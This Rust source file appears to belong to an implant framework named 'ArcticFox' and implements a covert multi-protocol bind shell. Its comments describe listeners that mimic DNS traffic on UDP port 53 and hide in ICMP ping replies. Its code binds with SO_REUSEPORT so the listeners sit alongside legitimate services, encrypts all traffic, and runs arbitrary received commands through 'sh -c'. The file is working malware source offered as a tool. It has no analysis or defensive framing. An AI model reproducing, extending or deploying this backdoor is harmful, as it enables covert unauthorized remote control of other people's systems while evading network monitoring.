//! ArcticFox Bind Shell — Multi-Protocol ZW-Encrypted Listener
//!
//! Binds on ALL specified protocols simultaneously:
//! - TCP: standard bind shell on any port
//! - UDP/53: DNS-port covert channel (looks like DNS traffic)
//! - ICMP: echo reply steganography (looks like ping responses)
//!
//! Every protocol uses:
//! - SO_REUSEPORT: coexist with existing services on the same port
//! - ZW-encrypted transport: encrypt→ZW-encode→send for all data
//! - Same session key across all protocols (single implant identity)
//!
//! Architecture:
//!   Client → TCP/ICMP/UDP → socket → ZW-decode → AEAD decrypt → shell
//!   Shell → AEAD encrypt → ZW-encode → socket → Client

pub mod icmp_bind;
pub mod tcp_bind;
pub mod udp_bind;

use std::os::fd::{AsRawFd, FromRawFd};
use std::sync::Arc;
use tokio::sync::Mutex;
use tracing::info;

use arcticfox_core::crypto::SESSION_KEY_LEN;
use arcticfox_zwtransport::ZwSession;

/// Shared shell controller.
pub struct ShellController {
    pub session: Mutex<ZwSession>,
    pub idle_timeout_secs: u64,
}

impl ShellController {
    pub fn new(session_key: [u8; SESSION_KEY_LEN], idle_timeout_secs: u64) -> Self {
        ShellController {
            session: Mutex::new(ZwSession::new(session_key)),
            idle_timeout_secs,
        }
    }

    /// Execute a shell command via the ZW session.
    pub async fn exec(&self, cmd: &str) -> String {
        use std::process::Command;
        let output = Command::new("sh")
            .arg("-c")
            .arg(cmd)
            .output();

        match output {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                let stderr = String::from_utf8_lossy(&out.stderr);
                if stderr.is_empty() {
                    stdout.to_string()
                } else {
                    format!("{}\n{}", stdout, stderr)
                }
            }
            Err(e) => format!("[error: {}]", e),
        }
    }
}

// ── SO_REUSEPORT Helper ─────────────────────────────────────────────────────

/// Set SO_REUSEPORT on a socket (Linux 3.9+, macOS, FreeBSD).
pub fn set_reuse_port(socket: &socket2::Socket) -> std::io::Result<()> {
    #[cfg(any(target_os = "linux", target_os = "android", target_os = "freebsd"))]
    unsafe {
        let optval: libc::c_int = 1;
        let ret = libc::setsockopt(
            socket.as_raw_fd(),
            libc::SOL_SOCKET,
            libc::SO_REUSEPORT,
            &optval as *const _ as *const libc::c_void,
            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
        );
        if ret != 0 {
            return Err(std::io::Error::last_os_error());
        }
    }
    #[cfg(target_os = "macos")]
    {
        socket.set_reuse_address(true)?;
    }
    Ok(())
}

/// Build a SO_REUSEPORT TCP listener.
pub fn tcp_reuse_listener(addr: &std::net::SocketAddr) -> std::io::Result<std::net::TcpListener> {
    let socket = socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::STREAM,
        Some(socket2::Protocol::TCP),
    )?;
    socket.set_reuse_address(true)?;
    set_reuse_port(&socket)?;
    socket.bind(&(*addr).into())?;
    socket.listen(128)?;
    Ok(std::net::TcpListener::from(socket))
}

/// Build a SO_REUSEPORT UDP socket.
pub fn udp_reuse_socket(addr: &std::net::SocketAddr) -> std::io::Result<std::net::UdpSocket> {
    let socket = socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::DGRAM,
        Some(socket2::Protocol::UDP),
    )?;
    socket.set_reuse_address(true)?;
    set_reuse_port(&socket)?;
    socket.bind(&(*addr).into())?;
    Ok(std::net::UdpSocket::from(socket))
}

/// Open a raw ICMP socket using libc (requires root/CAP_NET_RAW).
pub fn icmp_raw_socket() -> std::io::Result<std::net::UdpSocket> {
    // Use a raw AF_INET SOCK_RAW IPPROTO_ICMP socket
    let fd = unsafe {
        libc::socket(
            libc::AF_INET,
            libc::SOCK_RAW,
            libc::IPPROTO_ICMP,
        )
    };
    if fd < 0 {
        return Err(std::io::Error::last_os_error());
    }
    // Set IP_HDRINCL so we can build our own IP header
    unsafe {
        let optval: libc::c_int = 1;
        libc::setsockopt(
            fd,
            libc::IPPROTO_IP,
            libc::IP_HDRINCL,
            &optval as *const _ as *const libc::c_void,
            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
        );
    }
    // Wrap fd in a UdpSocket for tokio compatibility (we use spawn_blocking anyway)
    let socket = unsafe { std::net::UdpSocket::from_raw_fd(fd) };
    Ok(socket)
}
